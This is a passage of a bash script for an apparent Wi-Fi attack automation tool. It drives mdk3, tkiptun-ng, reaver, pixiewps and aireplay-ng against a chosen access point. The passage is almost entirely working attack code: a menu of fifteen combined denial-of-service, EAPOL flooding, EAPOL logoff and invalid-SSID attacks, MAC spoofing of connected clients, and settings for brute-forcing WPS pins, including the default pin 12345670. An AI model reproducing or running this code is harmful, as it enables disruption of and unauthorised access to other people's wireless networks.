\033[1;37m6.  DOS1 - DOS2 - EAPOL LO3\033[1;0m
\033[1;36m7.  EAPOL LO1 - EAPOL LO2 - DOS3\033[1;0m
\033[1;37m8.  EAPOL LO1 - EAPOL LO2 - EAPOL PF3\033[1;0m
\033[1;36m9.  EAPOL LO1 - EAPOL PF2 - EAPOL PF3\033[1;0m
\033[1;37m10. EAPOL LO1 - EAPOL PF2 - DOS3\033[1;0m
\033[1;36m11. Tkiptun-ng1 - Tkiptun-ng2 - Tkiptun-ng3\033[1;0m
\033[1;37m12. Invalid SSID1 -Invalid SSID2 - Invalid SSID3\033[1;0m
\033[1;36m13. DOS1 - Invalid SSID2 - Invalid SSID3\033[1;0m
\033[1;37m14. DOS1 - DOS2 - Invalid SSID3\033[1;0m
\033[1;36m15. DOS1 - EAPOL PF2 - Invalid SSID3\033[1;0m
   note: PF=Packet Flooding
         LO=Log Off")

echo "$MDKMENU" > /tmp/"MDKMENU"

xterm -g 48x21-1+1  -T "DDOS Menu" -e "cat < /tmp/MDKMENU; sleep 360" &

}

#~~~~~~~~~~~End DDOS Dropdown Menu End~~~~~~~~~#

#~~~~~~~~~~~~~~Start MDK DDOS Start~~~~~~~~~~~~~~~#

DDOS_fn()

{

	if [ $MDKTYPE1 == 0 ]; then

		ASSOC_CLIENT_fn

		fi


	if [ $MDKTYPE1 == 1 ]; then

ASSOC_CLIENT_fn

xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

xterm -g 80x10-1+200    -T "mdk3 DOS 2" -e "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

xterm -g 80x10-1+400    -T "mdk3 DOS 3" -e "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

       fi

#####start mdk3 EAPOL #######

	if [ $MDKTYPE1 == 2 ]; then

ASSOC_CLIENT_fn

	xterm -g 80x10-1+1 -T "EAPOL Packet Flooding 1" -e sh  -c "mdk3 $MON x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	xterm -g 80x10-1+200    -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	xterm -g 80x10-1+400    -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi

#####Start mdk3 combined DOS Heavy ###### 

	if [ $MDKTYPE1 == 3 ]; then

ASSOC_CLIENT_fn
sleep 1

xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

xterm -g 80x10-1+200    -T "mdk3 DOS 2" -e "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	xterm -g 80x10-1+400    -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi      

#####Start mdk3 combined heavy on EAPOL ###### 

	if [ $MDKTYPE1 == 4 ]; then

ASSOC_CLIENT_fn
sleep 1


	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	xterm -g 80x10-1+200    -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	xterm -g 80x10-1+400    -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi      

# Pure log off

	if [ $MDKTYPE1 == 5 ]; then

ASSOC_CLIENT_fn
sleep 1

	if [ ! -z  $CLIASO_MAX ]; then

	xterm -g 80x10-1+1 -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c $CLIASO_MAX -s 100" &

	else

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

		fi

sleep 1

	if [ ! -z  $CLIASO_MID ]; then

	xterm -g 80x10-1+200    -T "EAPOL Logoff 2" -e sh  -c "mdk3 $MON1 x 1 -t $TARGETAP1 -c $CLIASO_MID -s 100" &

	else

	xterm -g 80x10-1+200    -T "mdk3 DOS 2" -e "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

		fi

sleep 1

	if [ ! -z  $CLIASO_LOW ]; then

	xterm -g 80x10-1+400    -T "EAPOL Logoff 3" -e sh  -c "mdk3 $MON2 x 1 -t $TARGETAP1 -c $$CLIASO_LOW -s 100" &

	else

	xterm -g 80x10-1+400    -T "mdk3 DOS 3" -e "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

		fi

			fi

# DOS heavy EAPOL log off lite


	if [ $MDKTYPE1 == 6 ]; then

ASSOC_CLIENT_fn
sleep 1

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	xterm -g 80x10-1+200    -T "mdk3 DOS 2" -e "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	if [ ! -z  $CLIASO_MAX ]; then

	xterm -g 80x10-1+400    -T "EAPOL Logoff 3" -e sh  -c "mdk3 $MON2 x 1 -t $TARGETAP1 -c $CLIASO_MAX -s 100" &

	else

	xterm -g 80x10-1+400    -T "mdk3 DOS 3" -e "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

		fi

	fi

# DOS heavy EAPOL log off lite

	if [ $MDKTYPE1 == 7 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	xterm -g 80x10-1+1 -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c $CLIASO_MAX -s 100" &

		else

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a $TARGETAP1 -s 200 -m" &

			fi

sleep 1

		if [ ! -z  $CLIASO_MID ]; then

	xterm -g 80x10-1+200    -T "EAPOL Logoff 2" -e sh  -c "mdk3 $MON1 x 1 -t $TARGETAP1 -c $CLIASO_MID -s 100" &

		else

	xterm -g 80x10-1+200    -T "mdk3 DOS 2" -e "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" &


		fi

sleep 1

	xterm -g 80x10-1+400    -T "mdk3 DOS 3" -e "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

       fi

# EAPOL log off Heavy EAPOL Packet Flooding lite

	if [ $MDKTYPE1 == 8 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	xterm -g 80x10-1+1 -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c CLIASO_MAX -s 100" &

		else

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

		fi

sleep 1

		if [ ! -z  $CLIASO_MID ]; then

	xterm -g 80x10-1+200    -T "EAPOL Logoff 2" -e sh  -c "mdk3 $MON1 x 1 -t $TARGETAP1 -c $CLIASO_MID -s 100" &

		else

	xterm -g 80x10-1+200    -T "mdk3 DOS 2" -e "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" &

			fi
sleep 1

	xterm -g 80x10-1+400    -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi

# EAPOL log off lite EAPOL Packet Flooding heavy


	if [ $MDKTYPE1 == 9 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	xterm -g 80x10-1+1 -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c CLIASO_MAX -s 100" &

			else

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

				fi

sleep 1

	xterm -g 80x10-1+200    -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	xterm -g 80x10-1+400    -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi

# EAPOL log off lite EAPOL Packet Flooding lite DOS lite

	if [ $MDKTYPE1 == 10 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	xterm -g 80x10-1+1 -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c CLIASO_MAX -s 100" &

			else

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

				fi

sleep 1

	xterm -g 80x10-1+200    -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	xterm -g 80x10-1+400    -T "mdk3 DOS 3" -e "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

	fi

# tkiptun-ng

	if [ $MDKTYPE1 == 11 ]; then

ASSOC_CLIENT_fn
sleep 1

	# Change mac to assocated client if exists

	if [ ! -z  $CLIASO_MAX ]; then

			ifconfig $MON down
			sleep .1
			macchanger -m $CLIASO_MAX $MON
			sleep 2
			ifconfig $MON up

	xterm -g 80x10-1+1 -T "tkiptun-ng 1" -e "tkiptun-ng -a $TARGETAP1 -h $CLIASO_MAX $MON" & 

			else

	xterm -g 80x10-1+1 -T "tkiptun-ng 1" -e "tkiptun-ng -a $TARGETAP1 -h $MONMAC0 $MON" &

			fi

	# Change mac to assocated client if exists

	if [ ! -z  $CLIASO_MID ]; then

			ifconfig $MON1 down
			sleep .1
			macchanger -m $CLIASO_MID $MON1
			sleep 2
			ifconfig $MON1 up

sleep 1

	xterm -g 80x10-1+200    -T "tkiptun-ng 2" -e "tkiptun-ng -a $TARGETAP1 -h $CLIASO_MID  $MON1" &
	
			else

	xterm -g 80x10-1+200    -T "tkiptun-ng 2" -e "tkiptun-ng -a $TARGETAP1 -h $MONMAC1  $MON1" &

			fi
sleep 1

	# Change mac to assocated client if exists

	if [ ! -z  $CLIASO_LOW ]; then

			ifconfig $MON2 down
			sleep .1
			macchanger -m $CLIASO_LOW $MON2
			sleep 2
			ifconfig $MON2 up

	xterm -g 80x10-1+400    -T "tkiptun-ng 3" -e "tkiptun-ng -a $TARGETAP1 -h $CLIASO_LOW $MON2" &

			else

	xterm -g 80x10-1+400    -T "tkiptun-ng 3" -e "tkiptun-ng -a $TARGETAP1 -h $MONMAC2 $MON2" &

		fi

	fi

	if [ $MDKTYPE1 == 12 ]; then

ASSOC_CLIENT_fn
sleep 1

	xterm -g 80x10-1+1 -T "mdk-Invalid SSID1" -e "/root/mdk3-v6/mdk3 $MON t $CHANNEL_MDK $TARGETAP1 10" & 

sleep 2

	xterm -g 80x10-1+200    -T "mdk-Invalid SSID2" -e "/root/mdk3-v6/mdk3 $MON1 t $CHANNEL_MDK $TARGETAP1 10" & 

sleep 1

	xterm -g 80x10-1+400    -T "mdk-Invalid SSID3" -e "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi      

	if [ $MDKTYPE1 == 13 ]; then

ASSOC_CLIENT_fn
sleep 1

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

sleep 2

	xterm -g 80x10-1+200    -T "mdk-Invalid SSID2" -e "/root/mdk3-v6/mdk3 $MON1 t $CHANNEL_MDK $TARGETAP1 10" & 

sleep 1

	xterm -g 80x10-1+400    -T "mdk-Invalid SSID3" -e "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi

	if [ $MDKTYPE1 == 14 ]; then

ASSOC_CLIENT_fn
sleep 1

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

sleep 2

	xterm -g 80x10-1+200    -T "mdk3 DOS 2" -e "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" &

sleep 1

	xterm -g 80x10-1+400    -T "mdk-Invalid SSID3" -e "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi

	if [ $MDKTYPE1 == 15 ]; then

ASSOC_CLIENT_fn
sleep 1
#mdk3 DOS 1/EAPOL Packet Flooding 2/mdk-Invalid SSID3

	xterm -g 80x10-1+1 -T "mdk3 DOS 1" -e "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	xterm -g 80x10-1+200    -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	xterm -g 80x10-1+400    -T "mdk3-Invalid SSID3" -e "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi

######   DAMP MDK=y

}

#~~~~~~~~~~~~~~~~End DDOS_fn~~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Manual Config Handeling Start~~~~~~~~~~~~~~~#

CONFIG_ADJUST_fn()
{

source /root/VARMAC_CONFIG/$SOURCENAME

# Store the 22 source variables before changing w/ menu

CHANNELOLD=$CHANNEL1
USE_R1OLD=$USE_R1
RX1OLD=$RX1
RY1OLD=$RY1
LIVE1OLD=$LIVE1
USE_LONG1OLD=$USE_LONG1
MDKTYPE1OLD=$MDKTYPE1
MDKLIVEOLD=$MDKLIVE
PAUSEOLD=$PAUSE
REAVER_COUNTOLD=$REAVER_COUNT
MDK3_COUNTOLD=$MDK3_COUNT
WASH_COUNTOLD=$WASH_COUNT
DAMP_MDKOLD=$DAMP_MDK
ADVAN_TIMEOLD=$ADVAN_TIME
USE_AIRE1OLD=$USE_AIRE1
USE_AIRE0OLD=$USE_AIRE0
USE_DHSMALLOLD=$USE_DHSMALL
MACSELOLD=$MACSEL
ASSIGN_MACOLD=$ASSIGN_MAC
USE_PIXIEOLD=$USE_PIXIE
USE_FIRSTPINOLD=$USE_FIRSTPIN
RETESTPINOLD=$RETESTPIN

clear
echo -e "$info"
echo -e "    Check Entries - To change,$inp enter$info the$yel line number$info of the parameter to alter and"
echo -e "  follow program prompts. The entry changed will be$yel written$info to$yel $CON_FILENAME1-$MACALNUM$info."
echo ""
echo -e "$inp  1)$info Channel 0 (Zero in almost all cases)  $txtrst default= 0  $inp [$yel $CHANNEL1 $inp]"
echo -e "$inp  2)$info Use -r x:y with reaver (y/n)          $txtrst default= y  $inp [$yel $USE_R1 $inp]"
echo -e "$inp  3)$info x in -r x:y (number of times)         $txtrst default= 2  $inp [$yel $RX1 $inp]"
echo -e "$inp  4)$info y in -r x:y in sec                    $txtrst default= 15 $inp [$yel $RY1 $inp]"
echo -e "$inp  5)$info Reaver Live Time in sec(Stage II)     $txtrst default= 120$inp [$yel $LIVE1 $inp]"
echo -e "$inp  6)$info Use Long Reaver Command y/n           $txtrst default= y  $inp [$yel $USE_LONG1 $inp]"
echo -e "$inp  7)$info MDK Attack Type 0-15(Stage III)       $txtrst default= 4  $inp [$yel $MDKTYPE1 $inp]"
echo -e "$inp  8)$info Time in sec MDK3 is active(Stage III) $txtrst default= 15 $inp [$yel $MDKLIVE $inp]"
echo -e "$inp  9)$info Router Reset w/ Wash in sec(Stage IV) $txtrst default= 120$inp [$yel $PAUSE $inp]"
echo -e "$inp  10)$info Reaver countdown timer(Stage II) y/n $txtrst default= y  $inp [$yel $REAVER_COUNT $inp]"
echo -e "$inp  11)$info MDK3 countdown timer(Stage III) y/n  $txtrst default= y  $inp [$yel $MDK3_COUNT $inp]"
echo -e "$inp  12)$info WASH countdown timer(Stage IV) y/n   $txtrst default= y  $inp [$yel $WASH_COUNT $inp]"
echo -e "$inp  13)$info Dampen MDK3(Stage III) y/n           $txtrst default= y  $inp [$yel $DAMP_MDK $inp]"
echo -e "$inp  14)$info Advanced Scanning in sec y/n         $txtrst default= 120$inp [$yel $ADVAN_TIME $inp]"
echo -e "$inp  15)$info Aireplay --fakeauth(Stage I/II) y/n  $txtrst default= y  $inp [$yel $USE_AIRE1 $inp]"
echo -e "$inp  16)$info Aireplay --Deauth(Stage I/II) y/n    $txtrst default= n  $inp [$yel $USE_AIRE0 $inp]"
echo -e "$inp  17)$info Use --dhsmall Reaver(Stage I/II) y/n $txtrst default= y  $inp [$yel $USE_DHSMALL $inp]"
echo -e "$inp  18)$info Enter spoof mac address y/n          $txtrst default= n  $inp [$yel $MACSEL $inp]"
echo -e "$inp  19)$info Mac address to spoof in hex$txtrst AA:BC:DD:33:22:11    $inp [$yel $ASSIGN_MAC $inp]"
echo -e "$inp  20)$info Use Pixiewps   (Stage IV) y/n        $txtrst default= y  $inp [$yel $USE_PIXIE $inp]"
echo -e "$inp  21)$info Retest WPS pin 12345670 y/n          $txtrst default= y  $inp [$yel $USE_FIRSTPIN $inp]"
echo -e "$inp  22)$info Retest pin 12345670 every x cycles   $txtrst default= 50 $inp [$yel $RETESTPIN $inp]"
echo -e "$inp      c/C)ontinue$txtrst"

read var
case $var in

	1) echo -e "\033[36m\n$info Enter CHANNEL - Zero(0) should be used in almost all cases? Set channel only if mdk3 not used and router doesnot change channels.  $txtrst"
	read CHANNEL1
	tput sc
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/CHANNEL1=$CHANNELOLD/CHANNEL1=$CHANNEL1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	2) echo -e "\033[36m\n$info Use -r x:y in the reaver command line Enter y/n?$txtrst"
	read USE_R1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_R1=$USE_R1OLD/USE_R1=$USE_R1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	3) echo -e "\033[36m\n$info x (Times) in -r x:y?$txtrst"
	read RX1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/RX1=$RX1OLD/RX1=$RX1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	4) echo -e "\033[36m\n$info y (rest in sec) in -r x:y Enter seconds?$txtrst"
	read RY1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/RY1=$RY1OLD/RY1=$RY1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	5) echo -e "\033[36m\n$info Reaver Live Time(Attack Stage II) Enter seconds?$txtrst"
	read LIVE1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/LIVE1=$LIVE1OLD/LIVE1=$LIVE1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	6) echo -e "\033[36m\n$info Use Long Reaver Command Line(Best selection for WPS locked routers) Enter y/n$txtrst"
	read USE_LONG1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_LONG1=$USE_LONG1OLD/USE_LONG1=$USE_LONG1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	7) echo -e "\033[36m\n$info MDK3 Attack Type - Enter a number 0 to 15.$txtrst"
	MDKMENU_fn
	read MDKTYPE1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MDKTYPE1=$MDKTYPE1OLD/MDKTYPE1=$MDKTYPE1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	killall -q xterm
	CONFIG_ADJUST_fn;;

	8) echo -e "\033[36m\n$info MDK3 Live Time(Stage III) - Enter seconds to attack router$txtrst"
	read MDKLIVE
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MDKLIVE=$MDKLIVEOLD/MDKLIVE=$MDKLIVE/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	9) echo -e "\033[36m\n$info Router Reset period(Stage IV) Enter seconds$txtrst"
	read PAUSE
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/PAUSE=$PAUSEOLD/PAUSE=$PAUSE/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	10) echo -e "\033[36m\n$info Use Reaver Countdown Timer - Enter y/n  $txtrst"
	read REAVER_COUNT
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/REAVER_COUNT=$REAVER_COUNTOLD/REAVER_COUNT=$REAVER_COUNT/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	11) echo -e "\033[36m\n$info Use MDK3 Countdown Timer Enter y/n  $txtrst"
	read MDK3_COUNT
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MDK3_COUNT=$MDK3_COUNTOLD/MDK3_COUNT=$MDK3_COUNT/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	12) echo -e "\033[36m\n$info Use Wash Countdown Timer Enter y/n  $txtrst"
	read WASH_COUNT
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/WASH_COUNT=$WASH_COUNTOLD/WASH_COUNT=$WASH_COUNT/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	13) echo -e "\033[36m\n$info Dampen MDK3 when target inactive Enter y/n  $txtrst"
	read DAMP_MDK
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/DAMP_MDK=$DAMP_MDKOLD/DAMP_MDK=$DAMP_MDK/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	14) echo -e "\033[36m\n$info Advanced Scanning Time  Enter in sec  $txtrst"
	read ADVAN_TIME
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/ADVAN_TIME=$ADVAN_TIMEOLD/ADVAN_TIME=$ADVAN_TIME/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	15) echo -e "\033[36m\n$info Use Aireplay-ng --fakeauth Enter y/n  $txtrst"
	read USE_AIRE1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_AIRE1=$USE_AIRE1OLD/USE_AIRE1=$USE_AIRE1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	16) echo -e "\033[36m\n$info Use Aireplay-ng --deauth Enter y/n   $txtrst"
	read USE_AIRE0
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_AIRE0=$USE_AIRE0OLD/USE_AIRE0=$USE_AIRE0/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	17) echo -e "\033[36m\n$info Use --dhsmall w/Reaver Enter y/n  $txtrst"
	read USE_DHSMALL
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_DHSMALL=$USE_DHSMALLOLD/USE_DHSMALL=$USE_DHSMALL/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	18) echo -e "\033[36m\n$info Use a Specific Mac addresses y/n  $txtrst"
	read MACSEL
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MACSEL=$MACSELOLD/MACSEL=$MACSEL/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	19) echo -e "\033[36m\n$info Enter mac addresses in this formate ONLY AA:BC:DD:55:44:22  $txtrst"
	read ASSIGN_MAC
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/ASSIGN_MAC=$ASSIGN_MACOLD/ASSIGN_MAC=$ASSIGN_MAC/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	20) echo -e "\033[36m\n$info Use Pixiewps (StageIV) Enter y/n  $txtrst"
	read USE_PIXIE
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_PIXIE=$USE_PIXIEOLD/USE_PIXIE=$USE_PIXIE/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	21) echo -e "\033[36m\n$info Retest WPS Pin 12345670 Enter y/n  $txtrst"
	read USE_FIRSTPIN
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_FIRSTPIN=$USE_FIRSTPINOLD/USE_FIRSTPIN=$USE_FIRSTPIN/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	22) echo -e "\033[36m\n$info Retest WPS Pin 12345670 every X number of restart cycles.  $txtrst"
	read RETESTPIN
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/RETESTPIN=$RETESTPINOLD/RETESTPIN=$RETESTPIN/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;


	c|C) if [[ -z $CHANNEL1 || -z $USE_R1 || -z $RX1 || -z $RY1 || -z $LIVE1 || -z $USE_LONG1 || -z $MDKLIVE || -z $PAUSE || -z $REAVER_COUNT || -z $MDK3_COUNT || -z $WASH_COUNT || -z $DAMP_MDK || -z $ADVAN_TIME || -z $USE_AIRE1 || -z $USE_AIRE0 || -z $USE_DHSMALL || -z $MACSEL || -z $USE_PIXIE || -z $USE_FIRSTPIN || -z $RETESTPIN ]]; then

		echo -e "\033[31m$warn Something is wrong - try again"
		sleep 1
		CONFIG_ADJUST_fn
		fi;;

	*) 	CONFIG_ADJUST_fn;;
esac

}

#~~~~~~~~~~~~~~~END Manual Config Handeling END~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~start config dropdown start~~~~~~~~~~~~#

CONFIG_DROP_fn()
{

echo -e "$info  Entries in the$yel VARMAC_CONFIG/$SOURCENAME$txtrst"
cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "CHANNEL1=")) {print " " $1 "\t" "Zero = channel hopping. Program will assign channel(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_R1=")) {print " " $1 "\t" "Use of -r x:y command with reaver(Stage I/II)"}}' 

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "RX1=")) {print " " $1 "\t" "\t" "x in the -r x:y command with reaver(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "RY1=")) {print " " $1 "\t" "\t" "y in the -r x:y command with reaver(Stage I/II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "LIVE1=")) {print " " $1 "\t" "reaver live time in sec(Stage II)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "USE_LONG1=")) {print " " $1 "\t" "Use of long reaver command - y/Y is recommended(Stage I/II)" }}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MDKTYPE1=")) {print " " $1 "\t" "See help/configuration files for list of attack types(Stage III)"}}'

cat < VARMAC_CONFIG/$SOURCENAME | awk -F' ' '{ if(($1 ~ "MDKLIVE=")) {print " " $1 "\t" "time in seconds that mdk3 attack will be active(Stage III)"}}'

